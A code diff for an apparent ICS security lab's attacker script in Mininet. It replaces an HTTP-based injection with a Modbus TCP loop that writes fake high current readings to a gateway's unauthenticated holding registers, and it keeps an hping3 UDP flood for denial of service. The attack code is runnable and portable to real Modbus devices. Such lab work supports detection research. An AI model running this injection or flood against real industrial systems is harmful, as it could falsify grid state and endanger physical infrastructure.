@@ -1,19 +1,32 @@
 import os
 import sys
 import time
+import random
 from datetime import datetime
+
+from pymodbus.client import ModbusTcpClient
 
 DEFAULT_RTU_NAME = "h2"
 DEFAULT_GATEWAY_NAME = "h3"
 DEFAULT_ATTACKER_NAME = "h5"
 ATTACK_ACTIVE_FLAG = "/tmp/mitm_attack_active"
-H3_INJECT_ENABLE_FLAG = "/tmp/h3_http_inject_enabled"
 RUN_ID_FILE = "/tmp/mitm_run_id"
 BASE_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))
 MITM_LOG_DIR = os.path.join(BASE_DIR, "logs", "mitm")
 MITM_TRACE_CSV = os.path.join(MITM_LOG_DIR, "mitm_trace.csv")
+
+# Sama dengan RTU / gateway: holding register I bus, skala Modbus
+GATEWAY_IP = "10.0.2.2"
+MODBUS_PORT = 5020
+I_BASE_ADDR = 10
+I_SCALE = 50
+NUM_BUS = 5
+# Arus palsu tinggi agar overcurrent / false state terlihat (Modbus 16-bit aman dengan I_SCALE=50)
+I_INJECT_MIN_A = 1800.0
+I_INJECT_MAX_A = 2600.0
+
 sys.path.append(BASE_DIR)
-from logger.mitm_trace_logger import ensure_trace_csv, append_trace_row, now_ts
+from logger.mitm_trace_logger import ensure_trace_csv, append_trace_row, now_ts, get_run_id, get_phase_label
 
 
 def _new_run_id():
@@ -30,24 +43,27 @@ def _write_run_id(run_id):
 
 
 def _append_trace(run_id, event, detail, phase="post_attack"):
-    append_trace_row(MITM_TRACE_CSV, [
-        now_ts(),
-        run_id,
-        phase,
-        "h5",
-        event,
-        "",
-        "",
-        "",
-        "",
-        "",
-        "",
-        "",
-        "",
-        "",
-        "",
-        detail,
-    ])
+    append_trace_row(
+        MITM_TRACE_CSV,
+        [
+            now_ts(),
+            run_id,
+            phase,
+            "h5",
+            event,
+            "",
+            "",
+            "",
+            "",
+            "",
+            "",
+            "",
+            "",
+            "",
+            "",
+            detail,
+        ],
+    )
 
 
 def _append_route_snapshot(run_id, stage, rtu, gateway, attacker):
@@ -68,14 +84,84 @@ def _append_route_snapshot(run_id, stage, rtu, gateway, attacker):
     _append_trace(run_id, "routing_snapshot", " || ".join(route_blob))
 
 
-def run_mitm_attack(net, rtu_name=DEFAULT_RTU_NAME, gateway_name=DEFAULT_GATEWAY_NAME, attacker_name=DEFAULT_ATTACKER_NAME):
-    print("Running gateway compromise simulation over HTTP...")
+def _log_modbus_inject(bus: int, i_amp: float, addr_i: int):
+    append_trace_row(
+        MITM_TRACE_CSV,
+        [
+            now_ts(),
+            get_run_id(),
+            get_phase_label(),
+            "h5",
+            "modbus_tcp_inject",
+            bus,
+            "",
+            "",
+            "",
+            f"{i_amp:.6f}",
+            "",
+            "",
+            "",
+            "",
+            "",
+            f"holding_reg={addr_i} unit=1 I_SCALE={I_SCALE}",
+        ],
+    )
+
+
+def _run_modbus_false_injection_loop():
     """
-    Compromise simulation flow:
-    - Enable HTTP inject API on gateway (h3)
-    - Attacker (h5) sends injected current (I) periodically
-    - Gateway keeps V asli RTU, override I lalu forward ke OPC UA (for h4)
+    Dijalankan di namespace Mininet (h5) sebagai: python3 h5.py modbus-inject
+    Asumsi: penyerang di segmen yang sama dengan RTU dan gateway; Modbus TCP tanpa autentikasi,
+    sehingga koneksi TCP ke gateway :5020 dapat menulis holding register yang sama dipakai RTU.
     """
+    _ensure_mitm_trace()
+    host_log = os.path.join(BASE_DIR, "logs", "host", "h5.log")
+    os.makedirs(os.path.dirname(host_log), exist_ok=True)
+    client = ModbusTcpClient(GATEWAY_IP, port=MODBUS_PORT)
+    print(
+        f"[modbus-inject] Gateway {GATEWAY_IP}:{MODBUS_PORT} — false I pada holding {I_BASE_ADDR}..{I_BASE_ADDR + NUM_BUS - 1}",
+        flush=True,
+    )
+    while True:
+        try:
+            if not client.connect():
+                print(f"[modbus-inject] connect gagal, coba lagi...", flush=True)
+                time.sleep(2)
+                continue
+            for bus in range(1, NUM_BUS + 1):
+                i_amp = round(random.uniform(I_INJECT_MIN_A, I_INJECT_MAX_A), 3)
+                addr_i = I_BASE_ADDR + (bus - 1)
+                reg_val = int(i_amp * I_SCALE)
+                if reg_val > 65535:
+                    reg_val = 65535
+                rr = client.write_register(addr_i, reg_val, unit=1)
+                err = getattr(rr, "isError", None)
+                if callable(err) and err():
+                    print(f"[modbus-inject] bus {bus} write error: {rr}", flush=True)
+                else:
+                    _log_modbus_inject(bus, i_amp, addr_i)
+                    print(f"[modbus-inject] bus {bus} I={i_amp} A (reg={reg_val})", flush=True)
+            client.close()
+        except Exception as e:
+            print(f"[modbus-inject] error: {e}", flush=True)
+            try:
+                client.close()
+            except Exception:
+                pass
+        time.sleep(2)
+
+
+def run_mitm_attack(
+    net,
+    rtu_name=DEFAULT_RTU_NAME,
+    gateway_name=DEFAULT_GATEWAY_NAME,
+    attacker_name=DEFAULT_ATTACKER_NAME,
+):
+    """
+    False data injection lewat Modbus TCP ke gateway (bukan HTTP).
+    RTU sah dan penyerang sama-sama bisa menulis holding register tanpa autentikasi.
+    """
+    print("Running false data injection (Modbus TCP to gateway)...")
     _ensure_mitm_trace()
     run_id = _new_run_id()
     _write_run_id(run_id)
@@ -85,44 +171,33 @@ def run_mitm_attack(net, rtu_name=DEFAULT_RTU_NAME, gateway_name=DEFAULT_GATEWAY
     gateway_ip = gateway.IP()
     host_log = os.path.join(BASE_DIR, "logs", "host", f"{attacker_name}.log")
 
-    _append_trace(run_id, "mitm_requested", f"{attacker_name}->{gateway_name}")
+    _append_trace(run_id, "mitm_requested", f"{attacker_name}->{gateway_name} ModbusTCP->{gateway_ip}:{MODBUS_PORT}")
     _append_route_snapshot(run_id, "before_attack", rtu, gateway, attacker)
 
-    # Enable attack mode flags.
-    gateway.cmd(f"touch {H3_INJECT_ENABLE_FLAG}")
     attacker.cmd(f"touch {ATTACK_ACTIVE_FLAG}")
-    _append_trace(run_id, "flags_enabled", f"{H3_INJECT_ENABLE_FLAG},{ATTACK_ACTIVE_FLAG}")
+    _append_trace(run_id, "flags_enabled", f"{ATTACK_ACTIVE_FLAG}")
 
     attacker.cmd(f"mkdir -p {os.path.join(BASE_DIR, 'logs', 'host')}")
     attacker.cmd(
-        f"bash -lc \"echo '['$(date '+%Y-%m-%d %H:%M:%S')'] [h5] run_mitm_attack: begin run_id='$(cat /tmp/mitm_run_id 2>/dev/null)' gateway_ip={gateway_ip} >> {host_log}\""
+        f"bash -lc \"echo '['$(date '+%Y-%m-%d %H:%M:%S')'] [h5] run_mitm_attack: Modbus false-I inject run_id='$(cat /tmp/mitm_run_id 2>/dev/null)' gw={gateway_ip}:{MODBUS_PORT} >> {host_log}\""
     )
-    attacker.cmd("if [ -f /tmp/h5_http_inject.pid ]; then kill $(cat /tmp/h5_http_inject.pid) 2>/dev/null; rm -f /tmp/h5_http_inject.pid; fi")
     attacker.cmd(
-        "bash -lc '"
-        f"LOG=\"{host_log}\"; "
-        f"URL=\"http://{gateway_ip}:8088/inject\"; "
-        "echo \"[\"$(date \"+%Y-%m-%d %H:%M:%S\")\"] [h5] injector: starting url=$URL\"; "
-        "while true; do "
-        "  for b in 1 2 3 4 5; do "
-        "    i=$(python3 -c \"import random; print(round(random.uniform(1800.0,2600.0),3))\"); "
-        "    body=$(python3 -c \"import json,sys; b=int(sys.argv[1]); i=float(sys.argv[2]); print(json.dumps({\\\"token\\\":\\\"lab-sim-token\\\",\\\"bus\\\":b,\\\"i\\\":i,\\\"ttl\\\":8}))\" \"$b\" \"$i\"); "
-        "    echo \"[\"$(date \"+%Y-%m-%d %H:%M:%S\")\"] [h5] injector: try bus=$b i=$i\"; "
-        "    if out=$(curl -sS -m 3 -X POST -H \"Content-Type: application/json\" -d \"$body\" \"$URL\"); then "
-        "      echo \"[\"$(date \"+%Y-%m-%d %H:%M:%S\")\"] [h5] injector: OK bus=$b resp=$out\"; "
-        "    else "
-        "      echo \"[\"$(date \"+%Y-%m-%d %H:%M:%S\")\"] [h5] injector: FAIL bus=$b curl_exit=$?\"; "
-        "    fi; "
-        "  done; "
-        "  sleep 4; "
-        "done' "
-        f">> {host_log} 2>&1 & echo $! > /tmp/h5_http_inject.pid"
+        "if [ -f /tmp/h5_modbus_inject.pid ]; then kill $(cat /tmp/h5_modbus_inject.pid) 2>/dev/null; rm -f /tmp/h5_modbus_inject.pid; fi; "
+        "if [ -f /tmp/h5_http_inject.pid ]; then kill $(cat /tmp/h5_http_inject.pid) 2>/dev/null; rm -f /tmp/h5_http_inject.pid; fi"
     )
-    _append_trace(run_id, "injector_started", f"http://{gateway_ip}:8088/inject")
+
+    inject_script = os.path.abspath(__file__).replace("\\", "/")
+    host_log_q = host_log.replace("\\", "/")
+    attacker.cmd(
+        f"bash -lc 'nohup python3 -u \"{inject_script}\" modbus-inject >>\"{host_log_q}\" 2>&1 & echo $! > /tmp/h5_modbus_inject.pid'"
+    )
+    _append_trace(run_id, "injector_started", f"modbus_tcp://{gateway_ip}:{MODBUS_PORT} holding I")
     time.sleep(1)
     _append_route_snapshot(run_id, "after_attack_enabled", rtu, gateway, attacker)
 
-    print(f"Compromise simulation active: {attacker_name} -> {gateway_name} inject API (http://{gateway_ip}:8088/inject)")
+    print(
+        f"False injection active: {attacker_name} -> {gateway_name} Modbus TCP {gateway_ip}:{MODBUS_PORT} (holding I)"
+    )
 
 
 def run_dos_attack(net, mode="light"):
@@ -152,3 +227,8 @@ def run_dos_attack(net, mode="light"):
             f"hping3 --udp --flood -p {target_port} {target_ip} "
             f">> logs/host/h5.log 2>&1 &"
         )
+
+
+if __name__ == "__main__":
+    if len(sys.argv) >= 2 and sys.argv[1] == "modbus-inject":
+        _run_modbus_false_injection_loop()
